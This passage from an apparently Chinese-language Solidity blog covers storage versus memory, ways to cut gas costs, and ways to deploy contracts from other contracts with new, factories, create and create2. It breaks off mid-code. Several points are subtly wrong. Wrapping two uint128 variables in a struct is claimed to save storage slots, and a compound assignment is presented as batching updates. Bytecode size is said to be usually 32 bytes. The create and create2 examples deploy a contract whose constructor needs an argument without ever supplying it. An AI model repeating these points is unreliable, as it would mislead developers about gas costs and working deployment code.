<td align="left">函数调用时临时存储在 EVM 内存 (Memory) 中</td>
</tr>
<tr>
<td align="center">生命周期</td>
<td align="left">持久化，合约销毁之前一直存在</td>
<td align="left">临时，函数执行结束即释放</td>
</tr>
<tr>
<td align="center">成本</td>
<td align="left">写入存储需要高 Gas 成本</td>
<td align="left">使用内存成本较低</td>
</tr>
<tr>
<td align="center">用途</td>
<td align="left">存储合约的持久化数据</td>
<td align="left">处理临时计算或函数的中间结果</td>
</tr>
</tbody></table>
<p><strong>Gas 优化建议</strong></p>
<ul>
<li>状态变量优化<ul>
<li>紧密打包变量，减少存储槽的使用。</li>
<li>避免在循环中频繁读写存储。</li>
</ul>
</li>
<li>内存优化<ul>
<li>使用临时变量代替状态变量进行中间计算。</li>
<li>适时释放不再使用的内存。</li>
</ul>
</li>
</ul>
<p> 了解 Solidity 的状态与内存布局，能帮助开发者高效设计合约，同时优化 Gas 成本。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/12/05/blockchain/ethereum/solidity-reduce-gas/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/05/blockchain/ethereum/solidity-reduce-gas/" class="post-title-link" itemprop="url">solidity合约中如何减少gas消耗</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-05 17:02:46" itemprop="dateCreated datePublished" datetime="2024-12-05T17:02:46+08:00">2024-12-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-06 10:32:27" itemprop="dateModified" datetime="2024-12-06T10:32:27+08:00">2024-12-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>从设计原则、编码技巧、数据存储优化和具体示例四个方面，系统地讲解如何在 Solidity 合约中节省 Gas 费用。</p>
<h1 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h1><p><strong>减少合约调用次数</strong></p>
<ul>
<li>将多个逻辑步骤合并到单一函数中，避免多次外部调用。</li>
<li>尽量减少合约之间的交互，因为每次外部调用都涉及高 Gas 消耗。</li>
</ul>
<p><strong>避免频繁修改状态变量</strong></p>
<ul>
<li>修改状态变量（如 storage）比操作本地变量（如 memory）耗费更多 Gas。</li>
<li>在逻辑中优先使用本地变量，计算完后一次性更新状态变量。</li>
</ul>
<p><strong>简化复杂计算</strong></p>
<ul>
<li>将复杂计算移到链下处理，通过链上存储结果代替。</li>
<li>在链下生成哈希值等，只存储结果以减少链上计算开销。</li>
</ul>
<h1 id="编码技巧"><a href="#编码技巧" class="headerlink" title="编码技巧"></a>编码技巧</h1><h2 id="使用-view-和-pure-函数"><a href="#使用-view-和-pure-函数" class="headerlink" title="使用 view 和 pure 函数"></a>使用 view 和 pure 函数</h2><p>view 函数不修改状态，pure 函数不依赖链上状态，调用它们不消耗 Gas。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function add(uint a, uint b) public pure returns (uint) &#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="精简数据类型"><a href="#精简数据类型" class="headerlink" title="精简数据类型"></a>精简数据类型</h2><ul>
<li>使用适合的数据类型，比如 uint8 而非 uint256（仅当值范围确定小于 256）。</li>
<li>避免布尔值，因为布尔操作实际存储在 256 位。</li>
</ul>
<h2 id="利用-calldata-代替-memory"><a href="#利用-calldata-代替-memory" class="headerlink" title="利用 calldata 代替 memory"></a>利用 calldata 代替 memory</h2><p>函数的外部输入参数可用 calldata，节省内存分配成本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function processData(uint[] calldata data) external &#123;</span><br><span class="line">    // calldata 参数直接使用，无需复制</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="事件替代状态变量"><a href="#事件替代状态变量" class="headerlink" title="事件替代状态变量"></a>事件替代状态变量</h2><p>使用 emit 事件记录某些数据，而非存储状态变量。事件存储在日志中，成本低于 storage。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event DataProcessed(address indexed user, uint amount);</span><br></pre></td></tr></table></figure>

<h2 id="合理使用-immutable-和-constant"><a href="#合理使用-immutable-和-constant" class="headerlink" title="合理使用 immutable 和 constant"></a>合理使用 immutable 和 constant</h2><ul>
<li>immutable：部署后值不可更改，但比普通变量读取快。</li>
<li>constant：在编译时决定值，不占用存储空间。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 public immutable deployTime = block.timestamp;</span><br><span class="line">uint256 public constant FEE_RATE = 100;</span><br></pre></td></tr></table></figure>

<h1 id="数据存储优化"><a href="#数据存储优化" class="headerlink" title="数据存储优化"></a>数据存储优化</h1><h2 id="批量更新状态变量"><a href="#批量更新状态变量" class="headerlink" title="批量更新状态变量"></a>批量更新状态变量</h2><p>将多次状态变量更新合并为一次。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 不推荐</span><br><span class="line">balance = balance + 10;</span><br><span class="line">counter = counter + 1;</span><br><span class="line"></span><br><span class="line">// 推荐</span><br><span class="line">balance += 10;</span><br><span class="line">counter += 1;</span><br></pre></td></tr></table></figure>

<h2 id="使用结构体或映射存储数据"><a href="#使用结构体或映射存储数据" class="headerlink" title="使用结构体或映射存储数据"></a>使用结构体或映射存储数据</h2><p>将多个相关变量合并到一个 struct 或映射中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    uint256 balance;</span><br><span class="line">    uint256 lastUpdated;</span><br><span class="line">&#125;</span><br><span class="line">mapping(address =&gt; User) users;</span><br></pre></td></tr></table></figure>

<h2 id="减少存储变量数量"><a href="#减少存储变量数量" class="headerlink" title="减少存储变量数量"></a>减少存储变量数量</h2><p>优化存储布局，减少存储槽的使用（每个槽 32 字节）。多个变量可以合并到一个存储槽中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 不推荐</span><br><span class="line">uint128 public var1;</span><br><span class="line">uint128 public var2;</span><br><span class="line"></span><br><span class="line">// 推荐</span><br><span class="line">struct Combined &#123;</span><br><span class="line">    uint128 var1;</span><br><span class="line">    uint128 var2;</span><br><span class="line">&#125;</span><br><span class="line">Combined public data;</span><br></pre></td></tr></table></figure>

<h2 id="删除不必要的状态变量"><a href="#删除不必要的状态变量" class="headerlink" title="删除不必要的状态变量"></a>删除不必要的状态变量</h2><p>使用 delete 删除已用完的存储变量，释放存储空间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete users[userAddress];</span><br></pre></td></tr></table></figure>

<h1 id="其他优化建议"><a href="#其他优化建议" class="headerlink" title="其他优化建议"></a>其他优化建议</h1><ol>
<li>代码复用</li>
</ol>
<ul>
<li>将重复逻辑封装为内部函数，减少代码重复和部署大小。</li>
<li>使用库（library）减少代码复制。</li>
</ul>
<ol start="2">
<li>优化循环</li>
</ol>
<ul>
<li>避免大规模循环操作，因为每次迭代都会增加 Gas。</li>
<li>可以分阶段处理数据，减少单次调用的负载。</li>
</ul>
<ol start="3">
<li>Gas 预言机</li>
</ol>
<ul>
<li>部署前使用工具（如 Remix、Hardhat）模拟和估算 Gas。</li>
<li>优化部署的 Gas 成本。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/12/05/blockchain/ethereum/solidity-contract-creation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/05/blockchain/ethereum/solidity-contract-creation/" class="post-title-link" itemprop="url">创建管理合约</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-12-05 10:55:39 / Modified: 13:18:30" itemprop="dateCreated datePublished" datetime="2024-12-05T10:55:39+08:00">2024-12-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在 Solidity 中，一个合约可以通过多种方式在另一个合约中创建和管理另一个合约。</p>
<h1 id="合约内部部署（创建一个新合约"><a href="#合约内部部署（创建一个新合约" class="headerlink" title="合约内部部署（创建一个新合约"></a>合约内部部署（创建一个新合约</h1><p>Solidity 允许你在一个合约内部部署另一个合约。这通常是通过在合约中创建一个新的合约实例来实现的。你可以在构造函数或其他函数中动态部署一个新合约。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">        </span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">                            </span><br><span class="line">    function getOwner() public view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CreatorContract &#123;</span><br><span class="line">    address public lastCreatedContract;</span><br><span class="line">    </span><br><span class="line">    function createNewContract() public &#123;</span><br><span class="line">        NewContract newContract = new NewContract(msg.sender);</span><br><span class="line">        lastCreatedContract = address(newContract);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>CreatorContract 中有一个 createNewContract 函数，它使用 new 关键字创建了一个 NewContract 实例。NewContract 合约的构造函数接收 msg.sender 作为参数，意味着新合约的 owner 将是调用 createNewContract 函数的账户。</li>
<li>创建的新合约地址会存储在 lastCreatedContract 中。</li>
</ul>
<h1 id="合约工厂模式（Factory-Pattern）"><a href="#合约工厂模式（Factory-Pattern）" class="headerlink" title="合约工厂模式（Factory Pattern）"></a>合约工厂模式（Factory Pattern）</h1><p>另一种常见的做法是使用工厂模式，即一个合约作为工厂来部署多个合约实例。工厂合约允许你根据需要创建新合约，并管理这些合约实例。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Item &#123;</span><br><span class="line">    uint public id;</span><br><span class="line">    address public creator;</span><br><span class="line">        </span><br><span class="line">    constructor(uint _id, address _creator) &#123;</span><br><span class="line">        id = _id;</span><br><span class="line">        creator = _creator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ItemFactory &#123;</span><br><span class="line">    Item[] public items;</span><br><span class="line">    </span><br><span class="line">    function createItem(uint _id) public &#123;</span><br><span class="line">        Item newItem = new Item(_id, msg.sender);</span><br><span class="line">        items.push(newItem);</span><br><span class="line">    &#125;</span><br><span class="line">                                                                    </span><br><span class="line">    function getItems() public view returns (Item[] memory) &#123;</span><br><span class="line">        return items;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>ItemFactory 是一个工厂合约，它可以创建多个 Item 合约的实例，每个 Item 合约的创建者是调用工厂合约的账户。</li>
<li>createItem 函数部署了一个新的 Item 合约，并将它存储在 items 数组中。</li>
</ul>
<h1 id="调用外部合约（外部合约部署后实例化）"><a href="#调用外部合约（外部合约部署后实例化）" class="headerlink" title="调用外部合约（外部合约部署后实例化）"></a>调用外部合约（外部合约部署后实例化）</h1><p>有时，合约不需要在自己内部部署其他合约，而是可以通过调用已经部署的外部合约的地址来与其交互。这不是“创建”合约，但却是一种与其他合约交互的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IExternalContract &#123;</span><br><span class="line">    function getOwner() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractInteraction &#123;</span><br><span class="line">    IExternalContract public externalContract;</span><br><span class="line">            </span><br><span class="line">    constructor(address _externalContractAddress) &#123;</span><br><span class="line">        externalContract = IExternalContract(_externalContractAddress);</span><br><span class="line">    &#125;</span><br><span class="line">                                </span><br><span class="line">    function getExternalOwner() public view returns (address) &#123;</span><br><span class="line">        return externalContract.getOwner();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>ContractInteraction 合约通过接口与外部合约交互，调用了 IExternalContract 中的 getOwner 函数。</li>
<li>外部合约已经部署并被传入构造函数，ContractInteraction 合约与它交互。</li>
</ul>
<h1 id="使用-create2-来部署合约（指定地址部署）"><a href="#使用-create2-来部署合约（指定地址部署）" class="headerlink" title="使用 create2 来部署合约（指定地址部署）"></a>使用 create2 来部署合约（指定地址部署）</h1><p>create2 是一种更高级的部署方法，它允许你通过指定合约地址来部署合约。使用 create2 可以确保合约在指定的地址上部署，前提是你知道合约的字节码和盐值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FactoryWithCreate2 &#123;</span><br><span class="line">    event ContractCreated(address contractAddress);</span><br><span class="line"></span><br><span class="line">    function createNewContract(bytes32 salt) public &#123;</span><br><span class="line">        address newContractAddress;</span><br><span class="line">        bytes memory bytecode = type(NewContract).creationCode;</span><br><span class="line">                                        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            newContractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">                                                                            </span><br><span class="line">        emit ContractCreated(newContractAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    address public creator;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        creator = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>createNewContract 函数使用 create2 来部署一个新的 NewContract 合约。</li>
<li>create2 允许你在部署时指定一个 salt，确保你可以预测到部署合约的地址，前提是知道合约的字节码。</li>
</ul>
<h2 id="扩展信息"><a href="#扩展信息" class="headerlink" title="扩展信息"></a>扩展信息</h2><p>在 Solidity 中，type(NewContract).creationCode 是一种用于获取合约字节码的方法，它表示合约的创建代码。合约的字节码（bytecode）是它部署到区块链上的机器代码，其中包含了合约的逻辑和部署时所需的初始化数据。</p>
<p><strong>合约字节码的组成部分</strong></p>
<p>合约字节码可以分为以下几个主要部分：</p>
<ol>
<li>合约构造函数的初始化字节码</li>
<li>部署过程中的合约代码</li>
<li>合约的状态变量初始值</li>
</ol>
<h3 id="合约构造函数的初始化字节码"><a href="#合约构造函数的初始化字节码" class="headerlink" title="合约构造函数的初始化字节码"></a>合约构造函数的初始化字节码</h3><ul>
<li>构造函数的字节码：每个合约在部署时都会执行其构造函数。creationCode 中包含了构造函数的代码部分，它负责初始化合约的状态，通常包括合约的状态变量赋值、事件初始化等操作。</li>
<li>初始化参数：如果构造函数带有参数（例如合约需要初始化的状态变量），这些参数也会包含在 creationCode 中。部署合约时需要传递这些参数。</li>
</ul>
<p>creationCode：合约的“创建代码”，是用于部署合约的字节码，包含了构造函数的执行内容以及初始化步骤。在合约部署时，链上会执行这段创建代码，初始化合约，并且部署合约的 runtimeCode</p>
<p>type(NewContract).creationCode 提供了一个方法来获取合约的 创建代码（即部署合约时使用的字节码），这段代码由合约的构造函数（constructor）以及合约的初始化部分组成，执行时会将合约的运行时代码存储在区块链上。</p>
<p>creationCode 是合约创建时所需的字节码，包括构造函数的初始化部分、合约的部署逻辑等。</p>
<h3 id="部署过程中的合约代码"><a href="#部署过程中的合约代码" class="headerlink" title="部署过程中的合约代码"></a>部署过程中的合约代码</h3><ul>
<li>字节码本体：合约部署的代码（通常是 runtime code）会在合约创建时存储在链上。这个字节码本体包括了所有的业务逻辑和函数实现。它包含了所有合约的行为和功能，例如状态修改、函数调用等。</li>
</ul>
<p>runtimeCode：合约部署后剩余的代码，包含了合约的所有业务逻辑。合约一旦部署完成，它的 runtimeCode 就是唯一存在于区块链上的代码，而 creationCode 则只在合约创建时有作用。</p>
<h3 id="合约的状态变量初始值"><a href="#合约的状态变量初始值" class="headerlink" title="合约的状态变量初始值"></a>合约的状态变量初始值</h3><ul>
<li>初始化存储：合约在部署时，通常会有一些状态变量。它们的初始值会作为部署合约时的一部分被编码到创建代码中（如果有默认值）。这些值将在合约部署后存储到合约的状态中。</li>
</ul>
<h2 id="create-和-create2"><a href="#create-和-create2" class="headerlink" title="create 和 create2"></a>create 和 create2</h2><p>在 Solidity 中，create 和 create2 是用于部署合约的两种不同方法。二者的主要区别在于如何计算合约地址及其对地址预测的能力。理解这两者的原理及其差异对于优化合约部署和管理合约地址是非常重要的。</p>
<h3 id="create-的原理"><a href="#create-的原理" class="headerlink" title="create 的原理"></a>create 的原理</h3><p>create 是最常见的合约部署方式，它通过在 Ethereum 网络上发送一笔交易来部署一个新的合约。</p>
<ul>
<li>部署过程：合约的字节码通过交易提交到区块链网络，然后在区块链中分配一个新的地址。</li>
<li>地址计算：create 部署的合约的地址由 创建者的地址（msg.sender） 和 创建交易的nonce 决定。</li>
</ul>
<p><strong>合约地址计算公式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = keccak256(rlp_encode(sender, nonce))[12:]</span><br></pre></td></tr></table></figure>

<ul>
<li>sender：部署合约的账户地址（msg.sender）。</li>
<li>nonce：msg.sender 的交易计数，即发送交易的次数。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address create(uint256 value, bytes memory bytecode, uint256 bytecodeSize)</span><br></pre></td></tr></table></figure>

<ol>
<li>value（uint256）：该参数表示向新合约发送的以太币数量。在合约部署时，你可以指定一个 value，这部分以太币将转移到新部署的合约中。若不想发送以太币，value 为 0。<br> value 是一个 uint256 类型，表示你要发送到新合约的以太币金额。</li>
<li>bytecode（bytes memory）：即合约的字节码，它是合约代码的二进制形式。这是通过 type(Contract).creationCode 或其他类似的方法获取的合约字节码。<br> 这段字节码包含了合约的构造函数以及合约的逻辑代码。可以通过 type(MyContract).creationCode 获取。add(bytecode, 0x20) 字节码的存储位置，跳过前 32 字节，指向字节码的实际数据。</li>
<li>bytecodeSize(uint256) : 它表示合约字节码的长度（通常是 32 字节）。</li>
</ol>
<h4 id="使用create"><a href="#使用create" class="headerlink" title="使用create"></a>使用create</h4><p>create 是标准的合约部署方式，适用于常规场景。通常情况下，您无需关心合约的地址，只需让合约被部署到区块链即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    uint256 public value;</span><br><span class="line">    </span><br><span class="line">    constructor(uint256 _value) &#123;</span><br><span class="line">        value = _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    address public deployedContract;</span><br><span class="line">    </span><br><span class="line">    function deploy(uint256 _value, bytes32 _salt) external &#123;</span><br><span class="line">        bytes memory bytecode = type(NewContract).creationCode;  // 获取合约字节码</span><br><span class="line">        address contractAddress;</span><br><span class="line">        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            contractAddress := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        deployedContract = contractAddress;  // 记录新合约地址</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，Factory 合约会通过 create 部署一个新的 NewContract 合约。NewContract 的地址由 msg.sender 和 nonce 决定，因此无法在部署前预测。</p>
<h3 id="create2-的原理"><a href="#create2-的原理" class="headerlink" title="create2 的原理"></a>create2 的原理</h3><p>create2 是 Solidity 0.5.0 引入的一种新的合约部署方式，它为部署合约提供了额外的控制能力，特别是在可预测的合约地址生成方面。与 create 不同，create2 的合约地址不仅由部署者的地址和交易 nonce 决定，还由以下额外的内容决定：</p>
<ul>
<li>部署者的地址 (msg.sender)</li>
<li>salt：一个额外的任意字节值</li>
<li>合约字节码的哈希：即部署的合约的字节码。</li>
</ul>
<p><strong>合约地址计算公式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = keccak256(0xff ++ sender ++ salt ++ keccak256(bytecode))[12:]</span><br></pre></td></tr></table></figure>

<ul>
<li>0xff 是一个常量，用于确保合约地址计算的唯一性。</li>
<li>sender 是合约创建者的地址。</li>
<li>salt 是一个提供给 create2 的自定义值，可以是任意字节。</li>
<li>bytecode 是合约的字节码。</li>
</ul>
<p>create2 使得合约的地址可以在合约部署之前预先计算出来，因此我们可以在部署合约之前预测合约的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address create2(uint256 value, bytes memory bytecode, uint256 bytecodeSize, bytes32 salt)</span><br></pre></td></tr></table></figure>

<ol>
<li>value（uint256）：该参数表示向新合约发送的以太币数量。在合约部署时，你可以指定一个 value，这部分以太币将转移到新部署的合约中。若不想发送以太币，value 为 0。<br> value 是一个 uint256 类型，表示你要发送到新合约的以太币金额。</li>
<li>bytecode（bytes memory）：即合约的字节码，它是合约代码的二进制形式。这是通过 type(Contract).creationCode 或其他类似的方法获取的合约字节码。<br> 这段字节码包含了合约的构造函数以及合约的逻辑代码。可以通过 type(MyContract).creationCode 获取。add(bytecode, 0x20) 字节码的存储位置，跳过前 32 字节，指向字节码的实际数据。</li>
<li>bytecodeSize(uint256) : 它表示合约字节码的长度（通常是 32 字节）。</li>
<li>salt（bytes32）：salt 是一个自定义的 bytes32 类型值，它为合约的创建地址提供一个“随机数”。salt 用于确保合约地址计算的唯一性。通过修改 salt 的值，可以控制生成的合约地址，从而为每个合约生成一个独特的地址。<br> salt 是唯一标识合约部署的一部分。你可以通过传入不同的 salt 值来生成不同的合约地址，即使合约字节码完全相同。</li>
</ol>
<h4 id="使用create2"><a href="#使用create2" class="headerlink" title="使用create2"></a>使用create2</h4><p>create2 则允许你指定一个 salt 值，进而可以提前计算出部署后的合约地址。这对于某些应用非常有用，例如需要在合约创建之前就知道合约的地址，或者在某些情境下需要复用相同地址的合约。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    uint256 public value;</span><br><span class="line">    </span><br><span class="line">    constructor(uint256 _value) &#123;</span><br><span class="line">        value = _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    address public deployedContract;</span><br><span class="line">    </span><br><span class="line">    function deploy(uint256 _value, bytes32 _salt) external &#123;</span><br><span class="line">        bytes memory bytecode = type(NewContract).creationCode;  // 获取合约字节码</span><br><span class="line">        bytes32 salt = _salt;  // 使用用户传入的 salt 值</span><br><span class="line">        address contractAddress;</span><br><span class="line">        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            contractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        deployedContract = contractAddress;  // 记录新合约地址</span><br><span class="line">    